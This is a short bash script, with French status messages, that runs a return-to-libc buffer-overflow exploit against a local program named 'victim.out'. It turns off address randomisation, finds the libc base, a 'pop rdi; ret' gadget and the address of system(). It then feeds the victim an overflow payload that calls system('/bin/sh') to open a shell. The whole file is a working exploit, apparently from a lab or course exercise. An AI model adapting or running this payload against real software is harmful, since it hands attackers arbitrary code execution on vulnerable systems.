#!/bin/bash

echo Récupération adresse de libc ...
libc=/lib/x86_64-linux-gnu/libc.so.6

base=0x$(setarch `arch` -R ./findbase.out | grep -m1 libc | cut -f1 -d' ')
echo ...base : $base

gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
echo ...offset gadget : $gadget

system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
echo ...system : $system

addr=$(echo | setarch $(arch) -R ./victim.out | sed 1q)
echo ...name[64] : $addr

echo "Attaque !"
(((
printf %0144d 0; 
printf %016x $((base+gadget)) | tac -rs..; 
printf %016x $((addr +0x60)) | tac -rs..; 
printf %016x $((base+system)) | tac -rs.. ; 
echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch `arch` -R ./victim.out

